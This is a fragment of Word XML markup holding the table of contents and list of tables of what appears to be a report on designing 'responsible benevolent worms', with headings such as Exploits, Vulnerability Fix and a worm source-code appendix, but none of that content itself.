                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>22</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91" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Summary of characteristics of responsible benevolent worms</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736791 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>23</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792" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Framework Design</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736792 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>26</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3" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Auditable</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736793 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>26</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4" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Network Congestion Control</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736794 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>32</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5" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Semi-autonomous Replication</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736795 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>34</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6" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Notification</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736796 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>36</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7" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Undo</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736797 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>36</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8" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Other Considerations</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736798 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>37</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799" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Exploits</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736799 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>37</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800" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Vulnerability Fix</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736800 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>43</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1" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test Procedure</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736801 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>44</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="00161AB6" w:rsidRDefault="009349AB">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:noProof/>
              <w:color w:val="auto"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc321736802" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Steps to run test:</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736802 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>49</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3" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test Results</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736803 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>50</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4" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Conclusion</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736804 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>56</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5" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Future Work</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736805 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>57</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6" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>References</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736806 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>59</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7" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Appendix A - Test environment network diagram</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736807 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>62</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8" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Appendix B - IP allocation range used for test VMs</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736808 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>63</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09" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Appendix C - Important sections of source code for worm</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736809 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>65</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="00161AB6" w:rsidRDefault="009349AB">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:noProof/>
              <w:color w:val="auto"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc321736810" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Appendix D - Log file from run of worm originating from seed node</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736810 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>78</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="009119AC" w:rsidRDefault="009349AB">
          <w:r>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w:rsidR="00CC4FC7" w:rsidRPr="00CC4FC7" w:rsidRDefault="00CC4FC7" w:rsidP="00CC4FC7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003D2C00" w:rsidRPr="00861880" w:rsidRDefault="003D2C00" w:rsidP="00B63226">
      <w:pPr>
        <w:spacing w:after="0" w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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3D2C00" w:rsidRPr="00861880" w:rsidRDefault="003D2C00" w:rsidP="004758BF">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="3" w:name="_Toc321736775"/>
      <w:r w:rsidRPr="00861880">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">List of </w:t>
      </w:r>
      <w:r w:rsidR="00C0172C">
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:t>ables</w:t>
      </w:r>
      <w:bookmarkEnd w:id="3"/>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r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="002D0DDC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> TOC \h \z \c "Table" </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:hyperlink w:anchor="_Toc321730221" w:history="1">
        <w:r w:rsidR="006E2046" w:rsidRPr="00B96D67">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Table 1: First Iteration</w:t>
        </w:r>
        <w:r w:rsidR="006E2046">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="006E2046">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc321730221 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="006E2046">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>59</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>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hyperlink w:anchor="_Toc321730222" w:history="1">
        <w:r w:rsidR="006E2046" w:rsidRPr="00B96D67">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Table 2: Second Iteration</w:t>
        </w:r>
        <w:r w:rsidR="006E2046">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="006E2046">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc321730222 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="006E2046">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>61</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
